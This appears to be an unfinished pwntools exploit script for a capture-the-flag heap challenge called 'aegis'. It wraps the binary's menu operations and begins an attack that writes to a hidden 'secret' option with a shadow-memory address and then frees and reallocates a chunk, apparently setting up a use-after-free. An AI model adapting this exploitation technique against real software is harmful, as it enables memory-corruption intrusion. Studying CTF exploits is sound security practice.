#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./aegis"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
pid=None
def get_cc():
    global pid
    if len(sys.argv)==1:
        r=process(pwn_file)
        pid=r.pid
    else:
        r=remote("pwn.it",3333)
        pid=0
    return r

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.address)
    pause()

def add(r,size,content,ID):
    r.sendlineafter("Choice: ","1")
    r.sendlineafter("Size: ",str(size))
    if len(content) < size - 8:
        content=content+"\n"
    r.sendafter("Content: ",content)
    r.sendlineafter("ID: ",str(ID))

def show(r,idx):
    r.sendlineafter("Choice: ","2")
    r.sendlineafter("Index: ",str(idx))
    r.recvuntil("Content: ")
    data = r.recvuntil("ID: ")[:-4]
    id = int(r.recvuntil("===")[:-3])
    return data,id

def update(r,idx,content,ID):
    r.sendlineafter("Choice: ","3")
    r.sendlineafter("Index: ",str(idx))
    r.sendlineafter("New Content: ",content)
    r.sendlineafter("New ID: ",str(ID))

def dele(r,idx):
    r.sendlineafter("Choice: ","4")
    r.sendlineafter("Index: ",str(idx))

def secret(r,addr):
    r.sendlineafter("Choice: ","666")
    r.sendlineafter("Lucky Number: ",str(addr))

r = get_cc()
add(r,0x10,"a"*7,0xdeadbeef)
secret(r,0xc047fff8008)
dele(r,0)
add(r,0x10,"a"*7,0xdeadbeef)
debug()
r.interactive()




